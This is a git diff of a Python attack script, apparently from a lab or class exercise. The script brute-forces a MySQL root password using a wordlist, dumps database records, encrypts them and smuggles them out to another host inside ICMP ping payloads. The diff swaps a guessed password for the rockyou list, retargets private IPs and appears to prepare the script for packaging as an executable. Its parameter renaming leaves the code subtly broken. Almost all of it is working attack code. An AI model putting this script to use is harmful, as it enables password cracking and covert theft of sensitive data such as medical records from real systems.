@@ -6,6 +6,8 @@ from itertools import cycle
 import random
 import string
 
+os.chdir(sys._MEIPASS)
+
 # Crack password
 
 # function that checks if pw is correct
@@ -35,7 +37,7 @@ def query_to_string(x):
     return x
 
 # Get data
-def get_data(pw, host):
+def get_data(pw, dest):
     db = mysql.connect(
         host = host,
         user = "root",
@@ -85,6 +87,7 @@ def checksum(data):
     s = ~s & 0xFFFF
     return s
 
+# Sends the data in one packet.
 def sendOnePing(seq, dest_addr, ttl, data_to_send, timeout=2, packetsize=64):
     if packetsize:
         ICMP_LEN_BYTES = packetsize
@@ -111,9 +114,8 @@ def sendOnePing(seq, dest_addr, ttl, data_to_send, timeout=2, packetsize=64):
         "bbHHh", ICMP_ECHO_REQUEST,
         ICMP_CODE, ICMP_CHECKSUM, ICMP_ID, ICMP_SEQ)
     bytesInDouble = struct.calcsize("d")
-    data = "id ssn name birthdate contactinfo diagnosis severity drugName dosage1001 123456789 Our Guy 20200420 emailemail.com a bad case of monday mornings 3 coffee 20 1002 123456789 Our Guy 20200420 emailemail.com coronavirus 8 tylenol 10 1003 123456789 Our Guy 20200420 emailemail.com Bowdens Malady 5 pescaline D 6"
-    print(data.encode())
-    data = struct.pack("d", time.time()) + data.encode()
+    data = data_to_send
+    data = struct.pack("d", time.time()) + data.encode(errors = 'ignore')
 
     ICMP_CHECKSUM = checksum(header + data)
 
@@ -149,10 +151,11 @@ def sendOnePing(seq, dest_addr, ttl, data_to_send, timeout=2, packetsize=64):
             raise e
 
 def main():
-    host = "ec2-54-161-19-249.compute-1.amazonaws.com"
-    # hardcoded wordlist based on social engineering
-    # i.e. we saw a sticky note on the target machine that read "P_ _ _ _ _ _ _ ! # # #"
-    wordlist=["Password!123"]
+    host = "192.168.20.12"
+    destination = "192.168.20.9"
+    print("here we are:", os.getcwd())
+    wordlist=open("rockyou-75.txt","r+").read().splitlines()
+
     password = getPassword(wordlist, host)
     print("got password:", password)
     sql_result = get_data(password, host)
@@ -160,7 +163,7 @@ def main():
     data, key = encrypt_data(sql_result)
     print("encrypted data:", data)
     print("with key:", key)
-    sendOnePing(1, host, 102, data)
+    result = sendOnePing(1, destination, 102, data)
 
 if __name__ == "__main__":
     main()
